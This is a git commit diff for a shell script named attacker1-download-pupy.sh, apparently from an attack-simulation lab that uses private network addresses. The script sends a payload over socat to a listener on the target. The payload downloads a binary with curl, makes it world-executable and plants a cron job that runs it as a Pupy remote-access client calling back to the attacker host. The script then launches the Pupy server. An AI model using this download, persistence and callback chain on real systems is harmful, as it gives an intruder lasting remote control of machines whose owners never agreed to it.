989da024cbf40f34611aa2b28564f5a24b20c33a
Guillaume Brogi <guillaume.brogi@akheros.com>
2016-07-20 13:02:16 +0200

    Add untested moirai.ini

--- attacker1-download-pupy.sh
+++ attacker1-download-pupy.sh
@@ -3,8 +3,6 @@
 MIN=$(date --date="now + 1 minutes" +"%M")
 HOU=$(date --date="now + 1 minutes" +"%H")
 
-echo -e "curl http://10.0.51.100/pp -o /var/www/html/pp; chmod 777 /var/www/html/pp; echo \"${MIN} ${HOU} * * *  /var/www/html/pp simple --host 10.0.51.100:443\" > /tmp/mycron; crontab /tmp/mycron"
-echo -e "curl http://10.0.51.100/pp -o /var/www/html/pp; chmod 777 /var/www/html/pp; echo \"${MIN} ${HOU} * * *  /var/www/html/pp simple --host 10.0.51.100:443\" > /tmp/mycron; crontab /tmp/mycron" | socat - TCP:10.0.51.101:31337
+echo -e "curl http://192.168.51.5/pp -o /var/www/html/pp; chmod 777 /var/www/html/pp; echo \"${MIN} ${HOU} * * *  /var/www/html/pp simple --host 192.168.51.5:443\" > /tmp/mycron; crontab /tmp/mycron" | socat - TCP:192.168.51.100:31337
 python /root/pupy/pupy/pupysh.py
-
 
